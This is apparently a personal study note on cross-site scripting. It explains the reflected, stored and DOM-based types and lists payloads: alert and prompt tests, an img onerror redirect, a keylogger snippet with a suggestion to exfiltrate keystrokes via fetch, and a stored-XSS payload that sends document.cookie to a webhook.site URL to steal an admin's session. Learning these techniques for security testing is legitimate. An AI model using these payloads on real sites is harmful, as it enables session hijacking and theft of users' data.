XSS stands for Cross Site Scripting.

It lets us execute JavaScript on the victim's browser and often gives us control of the application for the user.

There are 3 main types of XXS:

1. Reflected: The script that you're trying to inject comes from the current HTTP request. You send a request and you get a response, and the script is in the response. Its somewhat limiting as you can only target yourself unless the payload is via the URL and maybe you entice the user to click on the link

![[Pasted image 20240902214331.png]]

2. Stored: It is much more powerful where the payload is stored in a place like a database and then retrieved later. This allows you to attack other users and therefore the impact of the thing is also much higher.

![[Pasted image 20240902214510.png]]

3. DOM-based: It basically means that the client side has some vulnerable JavaScript that uses untrusted inputs instead of a vulnerability server side. 

![[Pasted image 20240902214639.png]]

```
alert(1)
```

The above payload is the most common XSS method out there.

Due to certain updates in Chrome, its better to use commands like 'print()' and 'promt()' if you want to print something in the site.

Resource: https://portswigger.net/research/alert-is-dead-long-live-print

We can also do something interesting with XSS as well: 

```JavaScript
function logKey(event){console.log(event.key)}
document.addEventListener('keydown', logKey)
```

This function basically records keys being typed on the console. In a real life scenario though, you can replace console.log to a fetch API and exfiltrate information from there.

JS resource: https://www.w3schools.com/js/

```
<img src =x onerror='prompt(1)'>
```

This one is a very common payload.

Interesting use case:

```
<img src =x onerror='window.location.href="https://youtube.com"'>
```

to view the cookie using XSS you can use the following payload:

```
<script> alert(document.cookie) </script>
```

To get a cookie from the admin of a stored XSS Vuln, you can run this payload:

```
<script> var i= new Image; i.src="https://webhook.site/a70e5bba-d139-4c7c-a258-f82455305a5c/?" + document.cookie; </script>
```

/? at the end of the url basically means we want the cookie as a part of the url.